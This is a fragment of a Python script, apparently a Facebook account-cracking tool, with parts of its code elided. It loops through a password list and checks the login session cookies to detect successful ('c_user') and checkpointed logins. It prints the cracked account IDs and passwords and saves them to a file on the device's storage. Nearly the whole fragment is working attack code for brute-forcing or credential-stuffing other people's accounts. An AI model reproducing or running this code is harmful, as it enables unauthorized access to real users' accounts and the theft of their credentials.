...
def sarfraz():   
    ...
    if select =='1':
       ...
       #cutter()
    #elif select =='W':
        #os.system('xdg-open https://chat.whatsapp.com/01917670752')
        #pass
    #elif select =='F':
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [ALAHI-MAMA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ALAHI-MAMA.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    print(f"\r{A} [ALAHI-MAMA-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/ALAHI-MAMA.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
